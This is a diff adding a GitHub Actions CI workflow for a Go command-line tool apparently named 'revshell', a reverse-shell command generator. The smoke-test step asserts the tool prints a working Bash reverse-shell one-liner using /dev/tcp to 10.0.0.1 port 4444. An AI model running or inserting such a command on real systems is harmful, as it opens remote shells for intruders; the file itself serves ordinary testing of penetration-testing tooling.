@@ -1,0 +1,45 @@
+name: CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          submodules: true
+      - uses: actions/setup-go@v6
+        with:
+          go-version-file: go.mod
+      - name: gofmt
+        run: test -z "$(gofmt -l .)" || { gofmt -l .; exit 1; }
+      - run: go vet ./...
+      - run: go test -race ./...
+      - name: Catalog is up to date with the vendored generator
+        run: |
+          go generate ./...
+          git diff --exit-code -- internal/catalog/data.json
+      - name: Smoke test the CLI
+        run: |
+          go build -o revshell ./cmd/revshell
+          test "$(./revshell gen 'Bash -i' --ip 10.0.0.1 --port 4444 --shell /bin/bash)" = "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+      - uses: goreleaser/goreleaser-action@v6
+        with:
+          version: "~> v2"
+          args: check
+
+  gen:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          submodules: true
+      - uses: actions/setup-go@v6
+        with:
+          go-version-file: internal/gen/go.mod
+      - run: go vet ./...
+        working-directory: internal/gen
